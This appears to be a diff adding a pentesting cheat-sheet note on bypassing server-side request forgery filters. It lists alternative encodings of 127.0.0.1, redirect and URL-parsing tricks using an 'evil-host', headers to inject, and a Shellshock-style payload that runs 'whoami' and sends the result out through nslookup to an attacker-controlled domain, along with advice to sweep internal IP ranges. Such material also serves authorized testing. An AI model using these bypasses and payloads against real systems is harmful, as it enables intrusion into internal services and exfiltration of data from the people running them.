@@ -1,0 +1,36 @@
+Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using various techniques:
+
+-Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
+
+-Registering your own domain name that resolves to 127.0.0.1.
+
+-Obfuscating blocked strings using URL encoding or case variation.
+
+-Providing a URL that you control, which subsequently redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL.
+For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters.
+
+Bypass whitelist(thank you Orange,exploiting inconsistencies in URL parsing):
+
+https://expected-host:fakepassword@evil-host
+https://evil-host#expected-host
+https://expected-host.evil-host (Leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control)
+You can URL-encode characters to confuse the URL-parsing code.
+
+Open Redirection:
+
+Registering your own domain name that resolves(redirect) to 127.0.0.1. 
+
+Blind SSRF:
+
+-A common way to find blind SSRF is to do a nslookup to your domain, you can try with HTTP to your own domain but the result will depend on internal proxy settings.
+
+-With DNS you can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities(try all internal ip).
+A general payload for DNS is :  () { :; }; /usr/bin/nslookup $(whoami).MY_DNS_DOMAIN  
+
+HEADER for SSRF:
+
+Referer
+X-Forwarded-For
+X-Wap-Profile(header that should specify a URL to the device's User Agent Profile)
+
+
